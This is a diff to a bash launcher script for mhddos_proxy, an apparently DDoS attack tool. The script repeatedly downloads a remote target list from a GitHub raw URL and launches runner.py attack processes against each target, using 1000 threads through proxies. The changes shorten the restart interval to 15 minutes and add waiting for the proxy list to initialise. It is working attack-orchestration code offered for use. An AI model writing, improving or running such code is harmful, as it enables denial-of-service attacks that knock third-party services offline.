@@ -30,9 +30,9 @@ fi
 # read getopt’s output this way to handle the quoting right:
 eval set -- "$PARSED"
 
-refresh_interval="1h"
+refresh_interval="15m"
 thread_count="1000"
-process_count="2"
+process_count="1"
 stats_interval="30"
 
 # now enjoy the options in order and nicely split until we see --
@@ -66,30 +66,52 @@ while true; do
     esac
 done
 
-# Just in case kill previous copy of mhddos_proxy
-if pgrep -f runner.py; then pkill -f runner.py; fi
-if pgrep -f ./start.py; then pkill -f /start.py; fi
-if pgrep -f ifstat; then pkill -f ifstat; fi
+PROXY_DIR=~/mhddos_proxy
+PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt
 
 # Restart attacks and update targets every $refresh_interval
 while true
 do
+  # kill old copies of mhddos_proxy
+  echo -e "\nDDoS is (RE)STARTING. Killing old processes..."
+  if pgrep -f runner.py; then pkill -f runner.py; fi
+  if pgrep -f ./start.py; then pkill -f /start.py; fi
+  if pgrep -f ifstat; then pkill -f ifstat; fi
+  echo -e "\nDDoS is (RE)STARTING. Killing old processes... DONE!"
+
+  # delete old proxy file if present
+  if [ -f $PROXY_FILE ]; then
+      rm $PROXY_FILE
+  fi
+
   # Get number of targets in runner_targets
   number_of_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")
 
-  echo -e "\nNumber of targets: $number_of_targets\n"
+  echo -e "\nNumber of targets: $number_of_targets"
 
   # Launch multiple mhddos_proxy instances with different targets.
   for (( i=1; i<=number_of_targets; i++ ))
   do
     target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
 
-    cd ~/mhddos_proxy
-
     for (( j=1; j<=process_count; j++ ))
     do
       echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"
+
+      cd $PROXY_DIR
       python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&
+
+      # wait till the first process initializes proxy file properly
+      if [ ! -f $PROXY_FILE ]; then
+        echo -e "\nWaiting for proxies initialization. This might take several minutes..."
+
+        while [ ! -f $PROXY_FILE ]
+        do
+          sleep 1
+        done
+
+        echo -e "\nWaiting for proxies initialization. This might take several minutes... DONE!"
+      fi
     done
   done
 
@@ -99,11 +121,5 @@ do
 
   sleep $refresh_interval
   clear
-
-  echo -e "\nDDoS is RESTARTING. Killing old processes..."
-  if pgrep -f runner.py; then pkill -f runner.py; fi
-  if pgrep -f ./start.py; then pkill -f /start.py; fi
-  if pgrep -f ifstat; then pkill -f ifstat; fi
-  echo -e "\nDDoS is RESTARTING. Killing old processes... DONE!"
 
 done
